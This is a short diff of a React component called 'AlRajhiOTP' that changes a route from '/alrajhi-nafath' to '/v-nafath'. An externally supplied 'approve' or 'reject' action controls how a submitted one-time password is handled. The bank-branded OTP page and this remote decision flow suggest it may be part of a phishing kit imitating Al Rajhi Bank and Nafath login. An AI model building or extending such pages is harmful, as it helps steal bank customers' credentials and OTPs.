@@ -38,7 +38,7 @@ export default function AlRajhiOTP() {
     const action = codeAction.value;
     if (action) {
       if (action.action === "approve") {
-        navigate("/alrajhi-nafath");
+        navigate("/v-nafath");
       } else if (action.action === "reject") {
         // تفريغ الحقول وإظهار رسالة الخطأ
         setOtp("");
